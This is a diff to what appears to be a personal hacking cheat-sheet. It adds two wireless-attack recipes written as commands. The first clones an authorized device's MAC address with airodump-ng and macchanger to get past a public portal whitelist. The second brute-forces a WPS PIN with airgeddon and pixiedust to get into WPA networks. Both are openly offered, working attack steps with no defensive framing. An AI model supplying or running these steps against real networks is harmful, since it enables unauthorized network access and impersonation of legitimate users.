@@ -461,6 +461,32 @@ sftp -b batchfile.txt ~/.ssh/key_name username@hostname.example # using batch in
 
 ### MAC ADDRESS RANDOMIZATION ( CELL PHONES )
 
+### MAC ADDRESS RANDOMIZATION ( CELL PHONES )
+## CONNECTING TO PUBLIC PORTALS  --> swap mac address on whitelist with an already authorized Mac address 
+# 1. put card into wiresless monitor mode 
+# 2. find exisitng users on the whitelist. find the channel of ESSID 
+# 3. copy the mac connected to router. 
+sudo apt-get install macchanger aircrack-ng 
+sudo iwconfig wirelessInterface down 
+sudo macchanger -r wirelessInterface 
+ip a # to find current NICs in use 
+sudo airmon-ng start wirelessInterface # to put in into monitor mode 
+sudo airodump-ng wirelessInterface -c 11 --encrypt OPN # to see only open networks --> displays list of connected devices on network 
+sudo ifconfig nicNonMonitorMode down 
+sudo macchanger -m newMacfromabove nicNonMonitormode 
+sudo ifconfig nicNonMonitorMode up 
+
+
+### BYPASSING WPA WIRELESS SECURITY (BRUTEFORCE WIFI PIN, RATHER THAN WPA)
+# airgeddon (wireless attack framework including BULLY) must use  pixiedust too (not in airegeddon)
+# https://nulb.app/x49tg 
+# install airgeddon dependenacies 
+# command 2, then command 8 
+# once the search is used-- leverage pixy dust, optin 7
+git clone 'https://github.com/v1s1t0r1sh3r3/airgeddon'
+sudo ./airgeddon.sh  ## setup config 
+option 2, then option 8, then option 4 (to explore)
+
 
 ######## OPEN SSL #######
 # use private key to sign secret.enc. 
